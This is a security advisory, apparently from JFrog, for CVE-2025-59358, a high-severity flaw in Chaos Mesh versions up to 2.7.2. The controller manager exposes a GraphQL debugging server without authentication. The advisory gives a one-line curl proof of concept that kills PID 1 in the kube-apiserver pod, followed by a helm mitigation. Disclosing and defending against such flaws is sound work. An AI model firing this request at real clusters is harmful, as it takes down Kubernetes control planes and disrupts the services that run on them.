---
description: CVE-2025-59358, HIGH, Denial of Service via Unauthorized Access to Chaos Mesh debugging server
title: Chaos Mesh debugging server DoS
date_published: "2025-09-15"
last_updated: "2025-09-15"
xray_id: JFSA-2025-001449533
vul_id: CVE-2025-59358
cvss: 7.5
severity: high
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

Denial of Service via Unauthorized Access to Chaos Mesh debugging server

## Component

github.com/chaos-mesh/chaos-mesh

## Affected versions

(,2.7.2]

## Description

The Chaos Controller Manager in Chaos Mesh exposes a GraphQL debugging server without authentication to the entire Kubernetes cluster, which provides an API to kill arbitrary processes in any Kubernetes pod, leading to cluster-wide denial of service.


## PoC

```shell
curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' http://controller-manager-host:10082/query

```



## Vulnerability Mitigations

If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:

```shell
helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
```



## References

[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)

[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)



